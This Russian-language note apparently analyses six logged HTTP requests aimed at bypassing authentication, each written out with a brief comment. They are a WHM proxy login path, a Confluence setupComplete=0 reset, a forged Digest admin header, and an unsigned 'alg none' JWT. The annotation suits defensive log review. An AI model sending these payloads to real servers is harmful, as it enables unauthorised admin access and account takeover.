# Обход аутентификации / подделка сессий

### Запрос 1
```http
/\_\_\_proxy_subdomain_whm/login/?login_only=1
```
Действие: попытка прямого доступа к панели WHM (возможно, обход логина).

### Запрос 2
```http
/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache3F7IWMV8LfTSuMfTTcrrXt8KqD6
```
Действие: установка флагов конфигурации для включения отладочного режима (обход аутентификации в Atlassian Confluence?).

### Запрос 3
```http
/\_\_\_proxy_subdomain_whm/login/?login_only=1
```
Действие: повтор предыдущего (WHM).

### Запрос 4
```http
/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache3EtXax2Rr3r9py390jUdv5U2kOl
```
Действие: аналогично, с другим хешем.

### Запрос 5
```http
/servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service=
```
Действие: подделка Digest-заголовка для авторизации как администратор.

### Запрос 6
```http
/api/auth/cognito/callback?access_token=fglivand&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiZ3J1am9jYWZ6YyIsImVtYWlsIjoie3tlbWFpbH19In0=.
```
Действие: JWT с алгоритмом none – подделка токена для входа под любым пользователем.
